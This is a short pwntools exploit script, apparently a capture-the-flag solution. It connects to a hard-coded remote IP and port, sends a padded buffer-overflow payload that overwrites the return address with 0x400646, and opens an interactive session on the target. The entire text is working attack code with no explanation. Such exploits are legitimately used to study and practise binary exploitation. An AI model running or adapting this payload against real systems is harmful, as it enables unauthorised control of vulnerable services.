from pwn import *


r=remote("140.110.112.31",2121)

address=0x400646
payload="aaaaaaaabbbbbbbbcccccccddddddddeeeeeee"+p64(address)
r.recvuntil(':')
r.sendline(payload)
r.interactive()
